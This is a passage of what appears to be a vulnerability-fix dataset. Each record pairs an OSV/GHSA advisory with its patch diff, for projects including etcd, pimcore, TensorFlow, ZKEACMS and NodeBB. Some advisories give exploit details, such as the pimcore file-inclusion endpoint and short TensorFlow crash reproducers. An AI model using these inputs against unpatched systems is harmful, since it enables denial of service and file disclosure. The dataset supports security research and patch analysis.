'https:\/\/github.com\/etcd-io\/etcd\/commit\/0191509637546621d6f2e18e074e955ab8ef374d'}","dataset":"osv","summary":"Improper Authentication in etcd etcd versions 3.2.x before 3.2.26 and 3.3.x before 3.3.11 are vulnerable to an improper authentication issue when role-based access control (RBAC) is used and client-cert-auth is enabled. If an etcd client server TLS certificate contains a Common Name (CN) which matches a valid RBAC username, a remote attacker may authenticate as that user with any valid (trusted) client certificate in a REST API request to the gRPC-gateway.","published_date":"2022-02-15","chain_len":2,"project":"https:\/\/github.com\/etcd-io\/etcd","commit_href":"https:\/\/github.com\/etcd-io\/etcd\/commit\/bf9d0d8291dc71ecbfb2690612954e1a298154b2","commit_sha":"bf9d0d8291dc71ecbfb2690612954e1a298154b2","patch":"MULTI","chain_ord":"['0191509637546621d6f2e18e074e955ab8ef374d', 'bf9d0d8291dc71ecbfb2690612954e1a298154b2']","before_first_fix_commit":"{'9c6b407e7d45b89c72c45a065294b6eac91888ab'}","last_fix_commit":"bf9d0d8291dc71ecbfb2690612954e1a298154b2","chain_ord_pos":2.0,"commit_datetime":"01\/02\/2019, 20:54:40","message":"auth: disable CommonName auth for gRPC-gateway\n\nSigned-off-by: Sam Batschelet <sbatsche@redhat.com>","author":"Sam Batschelet","comments":null,"stats":"{'additions': 21, 'deletions': 0, 'total': 21}","files":"{'auth\/store.go': {'additions': 21, 'deletions': 0, 'changes': 21, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/etcd-io\/etcd\/raw\/bf9d0d8291dc71ecbfb2690612954e1a298154b2\/auth%2Fstore.go', 'patch': '@@ -1166,6 +1166,27 @@ func (as *authStore) AuthInfoFromTLS(ctx context.Context) (ai *AuthInfo) {\\n \\t\\t\\tUsername: chains[0].Subject.CommonName,\\n \\t\\t\\tRevision: as.Revision(),\\n \\t\\t}\\n+\\t\\tmd, ok := metadata.FromIncomingContext(ctx)\\n+\\t\\tif !ok {\\n+\\t\\t\\treturn nil\\n+\\t\\t}\\n+\\n+\\t\\t\/\/ gRPC-gateway proxy request to etcd server includes Grpcgateway-Accept\\n+\\t\\t\/\/ header. The proxy uses etcd client server certificate. If the certificate\\n+\\t\\t\/\/ has a CommonName we should never use this for authentication.\\n+\\t\\tif gw := md[\"grpcgateway-accept\"]; len(gw) > 0 {\\n+\\t\\t\\tif as.lg != nil {\\n+\\t\\t\\t\\tas.lg.Warn(\\n+\\t\\t\\t\\t\\t\"ignoring common name in gRPC-gateway proxy request\",\\n+\\t\\t\\t\\t\\tzap.String(\"common-name\", ai.Username),\\n+\\t\\t\\t\\t\\tzap.String(\"user-name\", ai.Username),\\n+\\t\\t\\t\\t\\tzap.Uint64(\"revision\", ai.Revision),\\n+\\t\\t\\t\\t)\\n+\\t\\t\\t} else {\\n+\\t\\t\\t\\tplog.Warningf(\"ignoring common name in gRPC-gateway proxy request %s\", ai.Username)\\n+\\t\\t\\t}\\n+\\t\\t\\treturn nil\\n+\\t\\t}\\n \\t\\tif as.lg != nil {\\n \\t\\t\\tas.lg.Debug(\\n \\t\\t\\t\\t\"found command name\",'}}","message_norm":"auth: disable commonname auth for grpc-gateway\n\nsigned-off-by: sam batschelet <sbatsche@redhat.com>","language":"en","entities":"[('auth', 'SECWORD', ''), ('auth', 'SECWORD', ''), ('sbatsche@redhat.com', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['auth\/store.go'])","num_files":1.0},{"index":2020,"vuln_id":"GHSA-h7f9-cvh5-qw7f","cwe_id":"{'CWE-22'}","score":0.0,"chain":"{'https:\/\/github.com\/pimcore\/pimcore\/commit\/1786bdd4962ee51544fad537352c2b4223309442'}","dataset":"osv","summary":"Path traversal in pimcore\/pimcore This affects the package pimcore\/pimcore before 6.8.8. A Local FIle Inclusion vulnerability exists in the downloadCsvAction function of the CustomReportController class (bundles\/AdminBundle\/Controller\/Reports\/CustomReportController.php). An authenticated user can reach this function with a GET request at the following endpoint: \/admin\/reports\/custom-report\/download-csv?exportFile=&91;filename]. Since exportFile variable is not sanitized, an attacker can exploit a local file inclusion vulnerability.","published_date":"2021-02-25","chain_len":1,"project":"https:\/\/github.com\/pimcore\/pimcore","commit_href":"https:\/\/github.com\/pimcore\/pimcore\/commit\/1786bdd4962ee51544fad537352c2b4223309442","commit_sha":"1786bdd4962ee51544fad537352c2b4223309442","patch":"SINGLE","chain_ord":"['1786bdd4962ee51544fad537352c2b4223309442']","before_first_fix_commit":"{'3224684a3375c35910f8544943f4c073d30c8bfa'}","last_fix_commit":"1786bdd4962ee51544fad537352c2b4223309442","chain_ord_pos":1.0,"commit_datetime":"02\/05\/2021, 09:39:02","message":"Fixed LFI in custom report csv download","author":"Bernhard Rusch","comments":null,"stats":"{'additions': 2, 'deletions': 1, 'total': 3}","files":"{'bundles\/AdminBundle\/Controller\/Reports\/CustomReportController.php': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pimcore\/pimcore\/raw\/1786bdd4962ee51544fad537352c2b4223309442\/bundles%2FAdminBundle%2FController%2FReports%2FCustomReportController.php', 'patch': \"@@ -433,7 +433,7 @@ public function createCsvAction(Request $request)\\n         $progress = $progress > 1 ? 1 : $progress;\\n \\n         return new JsonResponse([\\n-            'exportFile' => $exportFile,\\n+            'exportFile' => basename($exportFile),\\n             'offset' => $offset,\\n             'progress' => $progress,\\n             'finished' => empty($result['data']) || count($result['data']) < $limit,\\n@@ -451,6 +451,7 @@ public function downloadCsvAction(Request $request)\\n     {\\n         $this->checkPermission('reports');\\n         if ($exportFile = $request->get('exportFile')) {\\n+            $exportFile = PIMCORE_SYSTEM_TEMP_DIRECTORY . '\/' . basename($exportFile);\\n             $response = new BinaryFileResponse($exportFile);\\n             $response->headers->set('Content-Type', 'text\/csv; charset=UTF-8');\\n             $response->setContentDisposition(ResponseHeaderBag::DISPOSITION_ATTACHMENT, 'export.csv');\"}}","message_norm":"fixed lfi in custom report csv download","language":"en","entities":"[('fixed', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['bundles\/AdminBundle\/Controller\/Reports\/CustomReportController.php'])","num_files":1.0},{"index":2025,"vuln_id":"GHSA-h8hx-2c5r-32cf","cwe_id":"{'CWE-352'}","score":8.1,"chain":"{'https:\/\/github.com\/TrestleAdmin\/trestle-auth\/commit\/cb95b05cdb2609052207af07b4b8dfe3a23c11dc'}","dataset":"osv","summary":"Cross-Site Request Forgery (CSRF) in trestle-auth ### Impact\nA vulnerability in trestle-auth versions 0.4.0 and 0.4.1 allows an attacker to create a form that will bypass Rails' built-in CSRF protection when submitted by a victim with a trestle-auth admin session. This potentially allows an attacker to alter protected data, including admin account credentials.\n\n### Patches\nThe vulnerability has been fixed in trestle-auth 0.4.2 released to RubyGems.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [trestle-auth](https:\/\/github.com\/TrestleAdmin\/trestle-auth\/issues)\n* Email the maintainer at [sam@sampohlenz.com](mailto:sam@sampohlenz.com)","published_date":"2021-04-13","chain_len":1,"project":"https:\/\/github.com\/TrestleAdmin\/trestle-auth","commit_href":"https:\/\/github.com\/TrestleAdmin\/trestle-auth\/commit\/cb95b05cdb2609052207af07b4b8dfe3a23c11dc","commit_sha":"cb95b05cdb2609052207af07b4b8dfe3a23c11dc","patch":"SINGLE","chain_ord":"['cb95b05cdb2609052207af07b4b8dfe3a23c11dc']","before_first_fix_commit":"{'021955aa5d67260d6ba1faf2b5d59b9772164968'}","last_fix_commit":"cb95b05cdb2609052207af07b4b8dfe3a23c11dc","chain_ord_pos":1.0,"commit_datetime":"04\/12\/2021, 10:12:49","message":"Ensure CSRF protection is prepended before authentication before_actions","author":"Sam Pohlenz","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'lib\/trestle\/auth\/controller\/authentication.rb': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/TrestleAdmin\/trestle-auth\/raw\/cb95b05cdb2609052207af07b4b8dfe3a23c11dc\/lib%2Ftrestle%2Fauth%2Fcontroller%2Fauthentication.rb', 'patch': '@@ -9,6 +9,9 @@ module Authentication\\n \\n           prepend_before_action :require_authenticated_user\\n           prepend_before_action :authenticate_user\\n+\\n+          # Ensure that CSRF protection happens before authentication\\n+          protect_from_forgery prepend: true\\n         end\\n \\n       protected'}}","message_norm":"ensure csrf protection is prepended before authentication before_actions","language":"en","entities":"[('ensure', 'ACTION', ''), ('csrf', 'SECWORD', ''), ('protection', 'SECWORD', ''), ('authentication', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/trestle\/auth\/controller\/authentication.rb'])","num_files":1.0},{"index":2027,"vuln_id":"GHSA-h8pj-cxx2-jfg2","cwe_id":"{'CWE-20'}","score":9.1,"chain":"{'https:\/\/github.com\/encode\/httpx\/pull\/2185\/commits\/e3c495a32c63d8aa7f1bcf3b7b27ee1a0ff428e1'}","dataset":"osv","summary":"Improper Input Validation in httpx Encode OSS httpx <=1.0.0.beta0 is affected by improper input validation in `httpx.URL`, `httpx.Client` and some functions using `httpx.URL.copy_with`.","published_date":"2022-04-29","chain_len":1,"project":"https:\/\/github.com\/encode\/httpx","commit_href":"https:\/\/github.com\/encode\/httpx\/pull\/2185\/commits\/e3c495a32c63d8aa7f1bcf3b7b27ee1a0ff428e1","commit_sha":"e3c495a32c63d8aa7f1bcf3b7b27ee1a0ff428e1","patch":"SINGLE","chain_ord":"['e3c495a32c63d8aa7f1bcf3b7b27ee1a0ff428e1']","before_first_fix_commit":"{'b07fe7b0745e62be5ef9bce1bee9e7d7a8878552'}","last_fix_commit":"e3c495a32c63d8aa7f1bcf3b7b27ee1a0ff428e1","chain_ord_pos":1.0,"commit_datetime":"04\/21\/2022, 06:22:38","message":"Patch `copy_with`","author":"lebr0nli","comments":null,"stats":"{'additions': 5, 'deletions': 1, 'total': 6}","files":"{'httpx\/_urls.py': {'additions': 5, 'deletions': 1, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/encode\/httpx\/raw\/e3c495a32c63d8aa7f1bcf3b7b27ee1a0ff428e1\/httpx%2F_urls.py', 'patch': '@@ -484,7 +484,11 @@ def copy_with(self, **kwargs: typing.Any) -> \"URL\":\\n         #  \\\\_\/   \\\\______________\/\\\\_________\/ \\\\_________\/ \\\\__\/\\n         #   |           |            |            |        |\\n         # scheme     authority       path        query   fragment\\n-        return URL(self._uri_reference.copy_with(**kwargs).unsplit())\\n+        new_url = URL(self)\\n+        new_url._uri_reference = self._uri_reference.copy_with(**kwargs)\\n+        if new_url.is_absolute_url:\\n+            new_url._uri_reference = new_url._uri_reference.normalize()\\n+        return URL(new_url)\\n \\n     def copy_set_param(self, key: str, value: typing.Any = None) -> \"URL\":\\n         return self.copy_with(params=self.params.set(key, value))'}}","message_norm":"patch `copy_with`","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['httpx\/_urls.py'])","num_files":1.0},{"index":2028,"vuln_id":"GHSA-h8v5-p258-pqf4","cwe_id":"{'CWE-327'}","score":5.4,"chain":"{'https:\/\/github.com\/xwiki\/xwiki-platform\/commit\/26728f3f23658288683667a5182a916c7ecefc52'}","dataset":"osv","summary":"Use of a Broken or Risky Cryptographic Algorithm in XWiki Crypto API ### Impact\nXWiki Crypto API will generate X509 certificates signed by default using SHA1 with RSA, which is not considered safe anymore for use in certificate signatures, due to the risk of collisions with SHA1.\nNote that this API is never used in XWiki Standard but it might be used in some extensions of XWiki.\n\n### Patches\nThe problem has been patched in XWiki version 13.10.6, 14.3.1 and 14.4-rc-1. Since then, the Crypto API will generate X509 certificates signed by default using SHA256 with RSA.\n\n### Workarounds\nAdministrators are advised to upgrade their XWiki installation to one of the patched versions.\nIf the upgrade is not possible, it is possible to patch the module xwiki-platform-crypto in a local installation by applying the change exposed in https:\/\/github.com\/xwiki\/xwiki-platform\/commit\/26728f3f23658288683667a5182a916c7ecefc52 and re-compiling the module.\n\n### References\nhttps:\/\/jira.xwiki.org\/browse\/XWIKI-19676\nhttps:\/\/github.com\/openssl\/openssl\/blob\/master\/CHANGES.md?plain=1#L938\nhttps:\/\/github.com\/openssl\/openssl\/issues\/16650\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Jira XWiki](https:\/\/jira.xwiki.org)\n* Email us at [security ML](mailto:security@xwiki.org)","published_date":"2022-05-24","chain_len":1,"project":"https:\/\/github.com\/xwiki\/xwiki-platform","commit_href":"https:\/\/github.com\/xwiki\/xwiki-platform\/commit\/26728f3f23658288683667a5182a916c7ecefc52","commit_sha":"26728f3f23658288683667a5182a916c7ecefc52","patch":"SINGLE","chain_ord":"['26728f3f23658288683667a5182a916c7ecefc52']","before_first_fix_commit":"{'3b871d906e664fa1875fbeb088404cf31e9f0094'}","last_fix_commit":"26728f3f23658288683667a5182a916c7ecefc52","chain_ord_pos":1.0,"commit_datetime":"04\/30\/2022, 10:13:25","message":"XWIKI-19676: Update the RSA Crypto script service to use SHA256 instead of SHA1 for certificate signature","author":"Cl\u00e9ment Aubin","comments":"{'com_1': {'author': 'surli', 'datetime': '05\/02\/2022, 06:58:35', 'body': \"I don't know much this class, but is that ok in term of backward compatibility? If you have some signed stuff in the wiki with that script service, will it be still be able to verify the signature?\"}, 'com_2': {'author': 'aubincleme', 'datetime': '05\/02\/2022, 07:27:55', 'body': 'Yes to me it is fine : the SignerFactory is only used to sign certificates, not verify them. For this the CMSSignedDataVerifier is used instead, which is able to verify signatures based on the different algorithms supported by the crypto API.'}, 'com_3': {'author': 'tmortagne', 'datetime': '05\/02\/2022, 09:10:05', 'body': \"In that case, I'm wondering if this should be cherry-picked in 13.10.x. WDYT @aubincleme ?\"}, 'com_4': {'author': 'aubincleme', 'datetime': '05\/02\/2022, 09:46:37', 'body': 'Yes why not ; doing it now'}, 'com_5': {'author': 'aubincleme', 'datetime': '05\/02\/2022, 09:48:21', 'body': 'done as part of a7c3628609f63b04de80935efa2e1f82e1356846 ;\\xa0updating issue + release notes'}}","stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'xwiki-platform-core\/xwiki-platform-crypto\/xwiki-platform-crypto-script\/src\/main\/java\/org\/xwiki\/crypto\/script\/RSACryptoScriptService.java': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/xwiki\/xwiki-platform\/raw\/26728f3f23658288683667a5182a916c7ecefc52\/xwiki-platform-core%2Fxwiki-platform-crypto%2Fxwiki-platform-crypto-script%2Fsrc%2Fmain%2Fjava%2Forg%2Fxwiki%2Fcrypto%2Fscript%2FRSACryptoScriptService.java', 'patch': '@@ -86,7 +86,7 @@ public class RSACryptoScriptService implements ScriptService\\n     private KeyPairGenerator keyPairGenerator;\\n \\n     @Inject\\n-    @Named(\"SHA1withRSAEncryption\")\\n+    @Named(\"SHA256withRSAEncryption\")\\n     private SignerFactory signerFactory;\\n \\n     @Inject'}}","message_norm":"xwiki-19676: update the rsa crypto script service to use sha256 instead of sha1 for certificate signature","language":"en","entities":"[('update', 'ACTION', ''), ('rsa', 'SECWORD', ''), ('crypto', 'SECWORD', ''), ('certificate', 'SECWORD', ''), ('signature', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['xwiki-platform-core\/xwiki-platform-crypto\/xwiki-platform-crypto-script\/src\/main\/java\/org\/xwiki\/crypto\/script\/RSACryptoScriptService.java'])","num_files":1.0},{"index":2036,"vuln_id":"GHSA-h9px-9vqg-222h","cwe_id":"{'CWE-125'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/99085e8ff02c3763a0ec2263e44daec416f6a387'}","dataset":"osv","summary":"Heap OOB in `QuantizeAndDequantizeV3` ### Impact\nAn attacker can read data outside of bounds of heap allocated buffer in `tf.raw_ops.QuantizeAndDequantizeV3`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.QuantizeAndDequantizeV3(\n  input=[2.5,2.5], input_min=[0,0], input_max=[1,1], num_bits=[30],\n  signed_input=False, range_given=False, narrow_range=False, axis=3)\n```   \n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/11ff7f80667e6490d7b5174aa6bf5e01886e770f\/tensorflow\/core\/kernels\/quantize_and_dequantize_op.cc#L237) does not validate the value of user supplied `axis` attribute before using it to index in the array backing the `input` argument:\n\n```cc\nconst int depth = (axis_ == -1) ? 1 : input.dim_size(axis_);\n```\n\n### Patches\nWe have patched the issue in GitHub commit [99085e8ff02c3763a0ec2263e44daec416f6a387](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/99085e8ff02c3763a0ec2263e44daec416f6a387).\n  \nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Aivul Team from Qihoo 360.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/99085e8ff02c3763a0ec2263e44daec416f6a387","commit_sha":"99085e8ff02c3763a0ec2263e44daec416f6a387","patch":"SINGLE","chain_ord":"['99085e8ff02c3763a0ec2263e44daec416f6a387']","before_first_fix_commit":"{'11ff7f80667e6490d7b5174aa6bf5e01886e770f'}","last_fix_commit":"99085e8ff02c3763a0ec2263e44daec416f6a387","chain_ord_pos":1.0,"commit_datetime":"04\/27\/2021, 00:32:41","message":"Fix `tf.raw_ops.QuantizeAndDequantizeV3` array index failure.\n\nPiperOrigin-RevId: 370577691\nChange-Id: Ifeae64212f6bcd139435824fa2748d1329213c4c","author":"Amit Patankar","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'tensorflow\/core\/kernels\/quantize_and_dequantize_op.cc': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/99085e8ff02c3763a0ec2263e44daec416f6a387\/tensorflow%2Fcore%2Fkernels%2Fquantize_and_dequantize_op.cc', 'patch': '@@ -13,6 +13,7 @@ See the License for the specific language governing permissions and\\n limitations under the License.\\n ==============================================================================*\/\\n \\n+#include \"tensorflow\/core\/framework\/op_requires.h\"\\n #define EIGEN_USE_THREADS\\n \\n #if (defined(GOOGLE_CUDA) && GOOGLE_CUDA) || \\\\\\n@@ -234,6 +235,10 @@ class QuantizeAndDequantizeV3Op : public OpKernel {\\n \\n   void Compute(OpKernelContext* ctx) override {\\n     const Tensor& input = ctx->input(0);\\n+    OP_REQUIRES(ctx, axis_ < input.dims(),\\n+                errors::InvalidArgument(\\n+                    \"Axis requested is larger than input dimensions. Axis: \",\\n+                    axis_, \" Input Dimensions: \", input.dims()));\\n     const int depth = (axis_ == -1) ? 1 : input.dim_size(axis_);\\n     Tensor* output = nullptr;\\n     OP_REQUIRES_OK(ctx, ctx->allocate_output(0, input.shape(), &output));'}}","message_norm":"fix `tf.raw_ops.quantizeanddequantizev3` array index failure.\n\npiperorigin-revid: 370577691\nchange-id: ifeae64212f6bcd139435824fa2748d1329213c4c","language":"en","entities":"[('fix', 'ACTION', ''), ('370577691', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/quantize_and_dequantize_op.cc'])","num_files":1.0},{"index":2039,"vuln_id":"GHSA-hc6c-75p4-hmq4","cwe_id":"{'CWE-476'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a7116dd3913c4a4afd2a3a938573aa7c785fdfc6'}","dataset":"osv","summary":"Reference binding to null pointer in `MatrixDiag*` ops ### Impact\nThe implementation of [`MatrixDiag*` operations](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/4c4f420e68f1cfaf8f4b6e8e3eb857e9e4c3ff33\/tensorflow\/core\/kernels\/linalg\/matrix_diag_op.cc#L195-L197) does not validate that the tensor arguments are non-empty:\n\n```cc\n      num_rows = context->input(2).flat<int32>()(0);\n      num_cols = context->input(3).flat<int32>()(0);\n      padding_value = context->input(4).flat<T>()(0); \n``` \n\nThus, users can trigger null pointer dereferences if any of the above tensors are null:\n\n```python\nimport tensorflow as tf\n\nd = tf.convert_to_tensor([],dtype=tf.float32)\np = tf.convert_to_tensor([],dtype=tf.float32)\ntf.raw_ops.MatrixDiagV2(diagonal=d, k=0, num_rows=0, num_cols=0, padding_value=p)\n```\n\nChanging from `tf.raw_ops.MatrixDiagV2` to `tf.raw_ops.MatrixDiagV3` still reproduces the issue.\n\n### Patches\nWe have patched the issue in GitHub commit [a7116dd3913c4a4afd2a3a938573aa7c785fdfc6](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a7116dd3913c4a4afd2a3a938573aa7c785fdfc6).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ye Zhang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a7116dd3913c4a4afd2a3a938573aa7c785fdfc6","commit_sha":"a7116dd3913c4a4afd2a3a938573aa7c785fdfc6","patch":"SINGLE","chain_ord":"['a7116dd3913c4a4afd2a3a938573aa7c785fdfc6']","before_first_fix_commit":"{'4c4f420e68f1cfaf8f4b6e8e3eb857e9e4c3ff33'}","last_fix_commit":"a7116dd3913c4a4afd2a3a938573aa7c785fdfc6","chain_ord_pos":1.0,"commit_datetime":"04\/18\/2021, 03:55:53","message":"Validate `MatrixDiagV{2,3}` arguments to prevent breakage.\n\nPiperOrigin-RevId: 369056033\nChange-Id: Ic2018c297d3dd6f252dc1dd3667f1ed5cb1eaa42","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 16, 'deletions': 3, 'total': 19}","files":"{'tensorflow\/core\/kernels\/linalg\/matrix_diag_op.cc': {'additions': 16, 'deletions': 3, 'changes': 19, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/a7116dd3913c4a4afd2a3a938573aa7c785fdfc6\/tensorflow%2Fcore%2Fkernels%2Flinalg%2Fmatrix_diag_op.cc', 'patch': '@@ -192,9 +192,22 @@ class MatrixDiagOp : public OpKernel {\\n           upper_diag_index = diag_index.flat<int32>()(1);\\n         }\\n       }\\n-      num_rows = context->input(2).flat<int32>()(0);\\n-      num_cols = context->input(3).flat<int32>()(0);\\n-      padding_value = context->input(4).flat<T>()(0);\\n+\\n+      auto& num_rows_tensor = context->input(2);\\n+      OP_REQUIRES(context, TensorShapeUtils::IsScalar(num_rows_tensor.shape()),\\n+                  errors::InvalidArgument(\"num_rows must be a scalar\"));\\n+      num_rows = num_rows_tensor.flat<int32>()(0);\\n+\\n+      auto& num_cols_tensor = context->input(3);\\n+      OP_REQUIRES(context, TensorShapeUtils::IsScalar(num_cols_tensor.shape()),\\n+                  errors::InvalidArgument(\"num_cols must be a scalar\"));\\n+      num_cols = num_cols_tensor.flat<int32>()(0);\\n+\\n+      auto& padding_value_tensor = context->input(4);\\n+      OP_REQUIRES(context,\\n+                  TensorShapeUtils::IsScalar(padding_value_tensor.shape()),\\n+                  errors::InvalidArgument(\"padding_value must be a scalar\"));\\n+      padding_value = padding_value_tensor.flat<T>()(0);\\n     }\\n \\n     \/\/ Size validations.'}}","message_norm":"validate `matrixdiagv{2,3}` arguments to prevent breakage.\n\npiperorigin-revid: 369056033\nchange-id: ic2018c297d3dd6f252dc1dd3667f1ed5cb1eaa42","language":"en","entities":"[('validate', 'ACTION', ''), ('prevent', 'ACTION', ''), ('369056033', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/linalg\/matrix_diag_op.cc'])","num_files":1.0},{"index":2040,"vuln_id":"GHSA-hc72-vj3g-5g2g","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/SeriaWei\/ZKEACMS\/commit\/833c5460dc5c6152092f6ad54b8b832870a59903'}","dataset":"osv","summary":"Cross-site Scripting in ZKEACMS A cross-site scripting (XSS) vulnerability in \/navigation\/create?ParentID=%23 of ZKEACMS v3.5.2 allows attackers to execute arbitrary web scripts or HTML via a crafted payload injected into the ParentID parameter.","published_date":"2022-05-26","chain_len":1,"project":"https:\/\/github.com\/SeriaWei\/ZKEACMS","commit_href":"https:\/\/github.com\/SeriaWei\/ZKEACMS\/commit\/833c5460dc5c6152092f6ad54b8b832870a59903","commit_sha":"833c5460dc5c6152092f6ad54b8b832870a59903","patch":"SINGLE","chain_ord":"['833c5460dc5c6152092f6ad54b8b832870a59903']","before_first_fix_commit":"{'53109ba58bbeac75074583ec261732772ed1ecc5'}","last_fix_commit":"833c5460dc5c6152092f6ad54b8b832870a59903","chain_ord_pos":1.0,"commit_datetime":"04\/14\/2022, 14:55:34","message":"Sanitize Html\n\n#457","author":"wayne","comments":null,"stats":"{'additions': 36, 'deletions': 1, 'total': 37}","files":"{'src\/ZKEACMS\/Common\/Service\/NavigationService.cs': {'additions': 36, 'deletions': 1, 'changes': 37, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/SeriaWei\/ZKEACMS\/raw\/833c5460dc5c6152092f6ad54b8b832870a59903\/src%2FZKEACMS%2FCommon%2FService%2FNavigationService.cs', 'patch': '@@ -11,13 +11,16 @@\\n using ZKEACMS.Common.Models;\\n using Easy;\\n using Microsoft.EntityFrameworkCore;\\n+using ZKEACMS.Safety;\\n \\n namespace ZKEACMS.Common.Service\\n {\\n     public class NavigationService : ServiceBase<NavigationEntity, CMSDbContext>, INavigationService\\n     {\\n-        public NavigationService(IApplicationContext applicationContext, CMSDbContext dbContext) : base(applicationContext, dbContext)\\n+        private readonly IHtmlSanitizer _htmlSanitizer;\\n+        public NavigationService(IApplicationContext applicationContext, CMSDbContext dbContext, IHtmlSanitizer htmlSanitizer) : base(applicationContext, dbContext)\\n         {\\n+            _htmlSanitizer = htmlSanitizer;\\n         }\\n         public override DbSet<NavigationEntity> CurrentDbSet => DbContext.Navigation;\\n         public override ServiceResult<NavigationEntity> Add(NavigationEntity item)\\n@@ -27,8 +30,34 @@ public override ServiceResult<NavigationEntity> Add(NavigationEntity item)\\n                 item.ParentId = \"#\";\\n             }\\n             item.ID = Guid.NewGuid().ToString(\"N\");\\n+            Santize(item);\\n             return base.Add(item);\\n         }\\n+\\n+        public override ServiceResult<NavigationEntity> AddRange(params NavigationEntity[] items)\\n+        {\\n+            foreach (var item in items)\\n+            {\\n+                Santize(item);\\n+            }\\n+            return base.AddRange(items);\\n+        }\\n+\\n+        public override ServiceResult<NavigationEntity> Update(NavigationEntity item)\\n+        {\\n+            Santize(item);\\n+            return base.Update(item);\\n+        }\\n+\\n+        public override ServiceResult<NavigationEntity> UpdateRange(params NavigationEntity[] items)\\n+        {\\n+            foreach (var item in items)\\n+            {\\n+                Santize(item);\\n+            }\\n+            return base.UpdateRange(items);\\n+        }\\n+\\n         public override void Remove(NavigationEntity item)\\n         {\\n             Remove(m => m.ParentId == item.ID);\\n@@ -73,5 +102,11 @@ public void Move(string id, string parentId, int position, int oldPosition)\\n             }\\n             Update(nav);\\n         }\\n+\\n+        private void Santize(NavigationEntity item)\\n+        {\\n+            item.Title = _htmlSanitizer.Sanitize(item.Title);\\n+            item.Html = _htmlSanitizer.Sanitize(item.Html);\\n+        }\\n     }\\n }\\n\\\\ No newline at end of file'}}","message_norm":"sanitize html\n\n#457","language":"sq","entities":"[('sanitize', 'SECWORD', ''), ('#457', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/ZKEACMS\/Common\/Service\/NavigationService.cs'])","num_files":1.0},{"index":2045,"vuln_id":"GHSA-hf2m-j98r-4fqw","cwe_id":"{'CWE-287'}","score":9.8,"chain":"{'https:\/\/github.com\/NodeBB\/NodeBB\/commit\/04dab1d550cdebf4c1567bca9a51f8b9ca48a500'}","dataset":"osv","summary":"API token verification can be bypassed in NodeBB  ### Impact\nIncorrect logic present in the token verification step unintentionally allowed master token access to the API.\n\n### Patches\nThe vulnerability has been patch as of v1.18.5.\n\n### Workarounds\nCherry-pick commit hash 04dab1d550cdebf4c1567bca9a51f8b9ca48a500 to receive this patch in lieu of a full upgrade.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [security@nodebb.org](mailto:security@nodebb.org)","published_date":"2021-11-30","chain_len":1,"project":"https:\/\/github.com\/NodeBB\/NodeBB","commit_href":"https:\/\/github.com\/NodeBB\/NodeBB\/commit\/04dab1d550cdebf4c1567bca9a51f8b9ca48a500","commit_sha":"04dab1d550cdebf4c1567bca9a51f8b9ca48a500","patch":"SINGLE","chain_ord":"['04dab1d550cdebf4c1567bca9a51f8b9ca48a500']","before_first_fix_commit":"{'1783f918bc19568f421473824461ff2ed7755e4c'}","last_fix_commit":"04dab1d550cdebf4c1567bca9a51f8b9ca48a500","chain_ord_pos":1.0,"commit_datetime":"10\/25\/2021, 